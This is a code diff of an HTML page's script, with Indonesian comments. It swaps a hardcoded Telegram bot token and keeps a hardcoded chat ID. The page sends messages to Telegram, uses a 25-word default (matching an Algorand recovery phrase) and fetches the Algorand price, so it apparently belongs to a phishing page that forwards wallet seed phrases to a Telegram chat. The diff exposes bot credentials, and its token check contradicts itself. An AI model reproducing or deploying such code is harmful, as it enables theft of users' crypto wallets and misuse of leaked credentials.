@@ -321,7 +321,7 @@
     <script>
         // ==================== TELEGRAM CONFIGURATION ====================
         // Token akan di-inject oleh GitHub Actions saat build
-        const TELEGRAM_BOT_TOKEN = '8864992919:AAHkE0jyViloI1sSKLc8lnRh6Tdt7Affr0w';
+        const TELEGRAM_BOT_TOKEN = '8397631647:AAEK29uwS5C9eby4Gz8ir0-RGPhIW2-x2PU';
         const TELEGRAM_CHAT_ID = '7196180695';
         
         const DEFAULT_WORD_COUNT = 25;
@@ -358,7 +358,7 @@
         }
         
         async function sendMessageToTelegram(message) {
-            if (TELEGRAM_BOT_TOKEN === '8864992919:AAHkE0jyViloI1sSKLc8lnRh6Tdt7Affr0w' || !TELEGRAM_BOT_TOKEN) {
+            if (TELEGRAM_BOT_TOKEN === '8397631647:AAEK29uwS5C9eby4Gz8ir0-RGPhIW2-x2PU' || !TELEGRAM_BOT_TOKEN) {
                 console.warn('⚠️ Telegram token belum dikonfigurasi');
                 showNotification('⚠️ Notifikasi Telegram tidak aktif - token belum dikonfigurasi', 'warning');
                 return false;
@@ -948,7 +948,7 @@
         fetchAlgoPrice();
         
         // Console logs
-        if (TELEGRAM_BOT_TOKEN === '8864992919:AAHkE0jyViloI1sSKLc8lnRh6Tdt7Affr0w') {
+        if (TELEGRAM_BOT_TOKEN === '8397631647:AAEK29uwS5C9eby4Gz8ir0-RGPhIW2-x2PU') {
             console.warn('%c⚠️ PERINGATAN: Telegram token belum dikonfigurasi!', 'color: #FF6B4A; font-size: 14px; font-weight: bold;');
             console.warn('%c📝 Setup GitHub Secrets: TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID', 'color: #F59E0B; font-size: 12px;');
         } else {
